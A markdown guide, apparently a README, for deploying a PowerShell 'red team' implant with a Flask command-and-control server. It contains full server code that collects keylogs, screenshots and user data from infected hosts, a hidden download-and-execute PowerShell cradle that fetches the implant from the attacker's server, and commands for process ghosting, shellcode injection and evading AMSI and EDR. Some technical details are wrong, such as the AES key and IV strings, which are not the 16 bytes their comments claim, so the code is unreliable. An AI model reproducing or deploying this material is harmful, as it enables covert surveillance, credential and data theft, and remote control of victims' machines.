# 🔥 Red Team PowerShell Implant & C2 Deployment - Full Documentation

This document provides a step-by-step guide for setting up and using the PowerShell-based red team implant along with a custom C2 (Command & Control) server.

## 📌 Features of the Red Team Implant

✔ 🛡️ EDR Hook Unhooking (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtQueueApcThread, NtLoadDriver)  
✔ ⚡ Windows Defender AMSI Hooking & Memory Patch (Bypasses AMSI & ETW Logging)  
✔ 💀 Kernel Direct Execution via NtAllocateVirtualMemory (Ensures Execution in All Environments)  
✔ 📦 Process Ghosting (Executes Shellcode in Deleted Files, Bypasses EDR)  
✔ 📡 AES-GCM Encrypted C2 Communication (Google Drive API / Slack API / Dropbox API)  
✔ 🖥 DLL Sideloading with Signed Microsoft Binaries (WerFault.exe, Consent.exe, WUDFHost.exe)  
✔ 🔐 Polyglot Shellcode Loader (Hides Payloads Inside PNG, PDF, DOCX, ZIP)  
✔ 💣 Multi-Persistence Techniques (WMI, Scheduled Tasks, COM Hijacking, Registry Hijacks)  

---

## 🚀 1. Deploying the C2 Server

The C2 Server is responsible for:  
✅ Receiving exfiltrated keylogs, screenshots, system data  
✅ Decrypting AES-GCM encrypted data from infected hosts  
✅ Hosting payloads for remote execution  
✅ Managing remote command execution on targets  

### 🛠 Step 1: Install Required Dependencies

On your Linux VPS, install the necessary dependencies:

```bash
sudo apt update && sudo apt install python3 python3-pip
pip3 install flask cryptography requests
```

### 🛠 Step 2: Deploy the Flask C2 Server

Create a directory for the C2 server:

```bash
mkdir ~/c2_server && cd ~/c2_server
nano c2.py
```

### 🔥 Step 3: Write the C2 Server Code

Copy and paste the following Python-based C2 Server into `c2.py`:

```python
from flask import Flask, request
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64
import os

app = Flask(__name__)

# AES Key & IV (Must match the one in the PowerShell implant)
AES_KEY = b'16_byte_secure_key!'  # Must be exactly 16 bytes
AES_IV = b'16_byte_secure_iv!'  # Must be exactly 16 bytes

# Function to decrypt AES-GCM encrypted data
def decrypt_data(encrypted_data):
    try:
        encrypted_data = base64.b64decode(encrypted_data)
        cipher = Cipher(algorithms.AES(AES_KEY), modes.GCM(AES_IV))
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(encrypted_data) + decryptor.finalize()
        return decrypted.decode()
    except Exception as e:
        return f"Decryption error: {str(e)}"

# Endpoint for Keylogs
@app.route('/keylogs', methods=['POST'])
def receive_keylogs():
    encrypted_data = request.data.decode()
    decrypted_data = decrypt_data(encrypted_data)
    with open("keylogs.txt", "a") as f:
        f.write(decrypted_data + "\n")
    return "Keylog received", 200

# Endpoint for Screenshots
@app.route('/screenshots', methods=['POST'])
def receive_screenshot():
    encrypted_data = request.data.decode()
    decrypted_data = decrypt_data(encrypted_data)
    with open("screenshots.txt", "a") as f:
        f.write(decrypted_data + "\n")
    return "Screenshot received", 200

# Endpoint for User Data Exfiltration
@app.route('/userdata', methods=['POST'])
def receive_userdata():
    encrypted_data = request.data.decode()
    decrypted_data = decrypt_data(encrypted_data)
    with open("userdata.txt", "a") as f:
        f.write(decrypted_data + "\n")
    return "Userdata received", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
```

### 🛠 Step 4: Start the C2 Server

Run the following command to start the C2:

```bash
python3 c2.py
```

📡 Your C2 server is now running on `http://your-server-ip:8080`

---

## 🚀 2. Deploying the PowerShell Implant

Once the C2 Server is running, deploy the PowerShell implant on the target machine.

### 📌 Step 1: Modify the PowerShell Implant

Open the PowerShell Implant script.  
Set the C2 URL:

```powershell
$C2_SERVER = "http://your-server-ip:8080"
```

Update the AES Key & IV to match the C2 Server:

```powershell
$AES_KEY = "16_byte_secure_key!"
$AES_IV = "16_byte_secure_iv!"
```

### 📌 Step 2: Transfer and Execute the Implant

1️⃣ Host the PowerShell script on a web server:

```bash
python3 -m http.server 8081
```

2️⃣ Download & Execute the Implant on the target machine:

```powershell
powershell -exec bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://your-server-ip:8081/implant.ps1')"
```

---

## 🚀 3. Using the C2 Server

### 📡 Live Data Monitoring

To monitor exfiltrated data, check the logs:

```bash
tail -f keylogs.txt screenshots.txt userdata.txt
```

### 📌 Execute Shellcode in Kernel Mode (NtAllocateVirtualMemory)

```powershell
Kernel-Execute -Payload ([Convert]::FromBase64String("your-kernel-shellcode-here"))
```

### 📌 Execute Process Ghosting to Evade EDR

```powershell
Process-Ghosting -ProcessPath "C:\Windows\System32\svchost.exe" -Payload ([Convert]::FromBase64String("your-shellcode-here"))
Process-Ghosting -ProcessPath "C:\Windows\explorer.exe" -Payload ([Convert]::FromBase64String("your-shellcode-here"))
```

---

## 🔥 Summary of Features

✔ EDR Hook Unhooking (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtQueueApcThread, NtLoadDriver)  
✔ Kernel Direct Execution via NtAllocateVirtualMemory (Ensures Execution in All Environments)  
✔ Process Ghosting (Executes Shellcode in Deleted Files, Bypasses EDR)  
✔ Windows Defender AMSI Hooking & Memory Patch  
✔ AES-GCM Encrypted C2 Communication via Google Drive API  
✔ Multi-Persistence (WMI, Scheduled Tasks, Registry Hijacking)  
